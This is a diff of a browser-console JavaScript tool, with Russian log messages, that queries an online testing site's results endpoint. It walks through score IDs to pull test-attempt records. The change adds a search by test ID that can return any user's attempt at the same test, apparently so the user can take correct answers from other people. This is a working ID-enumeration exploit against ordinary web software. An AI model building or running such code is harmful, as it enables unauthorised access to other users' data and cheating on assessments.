@@ -1,7 +1,7 @@
 function dipeek_get(i){
   return new Promise(r=>$.ajax({
     type:'POST',url:'/ditest/index/result',
-    data:{action:'get_results_by_test',score_id:i,test_id:39999},
+    data:{action:'get_results_by_test',score_id:i,test_id:40001},
     dataType:'json',success:d=>r(d),
     error:(x,s,e)=>r({error:`ExtractionError:${e} (${s})`})
   }))}
@@ -13,7 +13,7 @@ function __dipeek_cur(){
   return _da=JSON.parse(t)}
 function __dipeek_set_cur(a){_da=a;sessionStorage._da=JSON.stringify(a)}
 
-async function dipeek_search(x,r=100){
+async function dipeek_search(x,r=200){
   _ds=0;let h=await dipeek_get(x);_t=0;_tqs=0;
   if (!h.error&&+h.simple.user_id==+USER_ID){__dipeek_set_cur(h);
     return console.log(`Удалось найти попытку! (${h.simple.id})`)}
@@ -25,6 +25,21 @@ async function dipeek_search(x,r=100){
     if(_ds)return console.log(`Поиск прерван.`);
     h=await dipeek_get(x-i);
     if(!h.error&&+h.simple.user_id==+USER_ID){__dipeek_set_cur(h);
+      console.log(`Удалось найти попытку! (${h.simple.id})`);return h}}
+  console.error(`Не удалось найти попытки у ИДЫ = ${x}!`)}
+async function dipeek_search2(x,r=200){
+  _ds=0;let h=await dipeek_get(x);_t=0;_tqs=0;
+  let t=+dipeek_find_test_id();
+  if (!h.error&&+h.simple.test_id==t){__dipeek_set_cur(h);
+    return console.log(`Удалось найти попытку! (${h.simple.id})`)}
+  for(let i=1;i<=r;i++){
+    if(_ds)return console.log(`Поиск прерван.`);
+    h=await dipeek_get(x+i);
+    if (!h.error&&+h.simple.test_id==t){__dipeek_set_cur(h);
+      console.log(`Удалось найти попытку! (${h.simple.id})`);return h}
+    if(_ds)return console.log(`Поиск прерван.`);
+    h=await dipeek_get(x-i);
+    if(!h.error&&+h.simple.test_id==t){__dipeek_set_cur(h);
       console.log(`Удалось найти попытку! (${h.simple.id})`);return h}}
   console.error(`Не удалось найти попытки у ИДЫ = ${x}!`)}
 
@@ -41,10 +56,10 @@ async function dipeek_train(x=1000000){
   return console.log(`Удалось найти попытку! (${h.simple.id})`)}
 
 const _dtr=/test\/index\/(\d+)/;
-function dipeek_find_test_id(){if(CURRENT_TEST_ID>0)return CURRENT_TEST_ID;
+function dipeek_find_test_id(){try{if(CURRENT_TEST_ID>0)return CURRENT_TEST_ID;}catch{}
   let m=_dtr.exec(document.URL);if(!m)throw new Error("Не удалось извлечь айди теста!");return+m[1]}
 const _dqr=/test\/index\/\d+\/(\d+)/;
-function dipeek_find_question_id(){if(QUESTION_ID>0)return QUESTION_ID;
+function dipeek_find_question_id(){try{if(QUESTION_ID>0)return QUESTION_ID;}catch{}
   let m=_dqr.exec(document.URL);if(!m)throw new Error("Не удалось извлечь айди вопроса!");return+m[1]}
 
 function dipeek_get_question(i){
